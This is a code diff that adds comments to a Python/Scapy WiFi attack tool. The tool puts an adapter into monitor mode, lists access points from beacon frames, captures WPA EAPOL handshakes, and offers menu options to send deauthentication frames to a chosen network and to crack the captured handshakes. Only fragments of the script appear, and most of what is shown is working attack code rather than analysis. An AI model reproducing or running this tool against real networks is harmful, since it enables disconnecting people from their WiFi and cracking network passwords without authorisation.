@@ -34,9 +34,9 @@ class APInfo:
 
         clientMac = packet.addr1 if packet.addr2 == self.BSSID else packet.addr2
 
-        if clientMac not in self.clientHandshakes.keys():
+        if clientMac not in self.clientHandshakes.keys(): # First Packet
             self.clientHandshakes[clientMac] = [packet]
-        elif packet[0].load != self.clientHandshakes[clientMac][0].load:
+        elif packet[0].load != self.clientHandshakes[clientMac][0].load: # Second Packet
             self.clientHandshakes[clientMac].append(packet)
             self.capturedHandshake = True
             self.packets = self.clientHandshakes[clientMac]
@@ -72,17 +72,21 @@ def sniffCallback(packet):
     except:
         SSID = None
 
+    # If broadcast packet
     if SSID != None and packet.type == 0 and packet.subtype == 8:
         global SSIDList
 
         if BSSID in SSIDList.keys(): return
         SSIDList[BSSID] = APInfo(BSSID, SSID.decode('utf-8'), int(ord(packet[Dot11Elt:3].info)))
 
+    # If authentication packet
     if packet.haslayer(EAPOL) and BSSID in SSIDList.keys() and (DestMAC == BSSID or SrcMAC == BSSID):
         SSIDList[BSSID].storeHandshakeFrame(packet)
 
 def doAttack():
     refreshNetworks = True
+
+    # Choose SSID to crack
     while refreshNetworks:
         refresh = "Refresh Networks List"
         back = "Back to Main Menu"
@@ -98,6 +102,7 @@ def doAttack():
     
     if result[0] == back: return
 
+    # Extract MAC address
     targetMac = result[0][2:19]
     print("Sending deauth frames to " + targetMac + "...")
 
@@ -190,10 +195,12 @@ def doCrack():
 
 
 def main():
+    # Force root access
     if geteuid() != 0:
         print("Please run this script as root")
         exit(1)
 
+    # Make user choose interface
     interfaces = if_nameindex()
     result = prompt({ "message": "Select WiFi Adapter:", "type": "list", "choices": [f"# {x[1]}" for x in interfaces] + ["Quit"], "pointer": pointer })
     if result[0] == "Quit": exit(0)
@@ -201,15 +208,18 @@ def main():
     global interface
     interface = result[0][2:]
 
+    # Turn interface into monitor mode to enable Dot11 sniffing
     print("Turning interface into monitor mode...")
     system(f"ifconfig {interface} down")
     system(f"iwconfig {interface} mode monitor")
     system(f"ifconfig {interface} up")
     print("Interface turned into monitor mode!")
 
+    # Start background threads
     Thread(target=channelThread, daemon=True).start()
     Thread(target=sniffThread, daemon=True).start()
 
+    # Main loop
     while True:
         attack = "DeAuth WiFi Networks"
         crack = "Crack Captured Handshakes"
@@ -218,6 +228,7 @@ def main():
         if result[0] == attack: doAttack()
         elif result[0] == crack: doCrack()
         else:
+            # Turn interface back into managed mode
             system(f"ifconfig {interface} down")
             system(f"iwconfig {interface} mode managed")
             system(f"ifconfig {interface} up")
